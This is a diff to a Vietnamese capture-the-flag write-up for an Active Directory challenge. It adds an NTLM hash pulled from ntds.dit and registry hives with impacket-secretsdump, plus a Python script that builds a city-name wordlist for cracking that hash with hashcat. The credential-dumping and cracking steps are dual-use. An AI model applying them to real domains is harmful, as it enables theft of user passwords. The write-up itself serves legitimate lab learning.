@@ -8,12 +8,30 @@ Sử dụng BloodHound để soi `explore/cypher/All Domain Admins`, ta thấy �
 ![image](https://github.com/user-attachments/assets/5be1077f-a399-4c97-bc65-32424ce120f8)
 
 Trong thư mục của jake có `ntds.dit`, `sam.hive`, `system.hive` đủ 3 điều kiện để sử dụng `impacket-secretdump -ntds ntds.dit -sam sam.hive -system system.hive LOCAL` để lấy ntlm hash của jessica
-
+```
+8fcdcffba18f392df7aa291527290aff
+```
 Format mật khẩu là `wctf{bl00dh0und_is_c00l_cityxxx}` xxx là 3 số ngẫu nhiên
 
 Có thể lấy danh sách các thành phố ở https://github.com/FinNLP/cities-list/blob/master/list.txt
 
 Sau đó dùng `pwFormat.py` tạo wordlist custom 
+
+```py
+with open("cities.txt", "r") as file:
+    cities = file.readlines()
+
+formatted_cities = []
+for city in cities:
+    city = "wctf{bl00dh0und_is_c00l_" + city.strip().lower()
+    formatted_cities.append(city)
+
+with open("cities_wordlist.txt", "w") as file:
+    for formatted_city in formatted_cities:
+        file.write(formatted_city + "\n")
+
+print("Written into cities_wordlist.txt")
+```
 
 wctf{bl00dh0und_is_c00l_city + 3 số ngẫu nhiên và "}" sẽ được thêm vào khi sử dụng hashcat
 
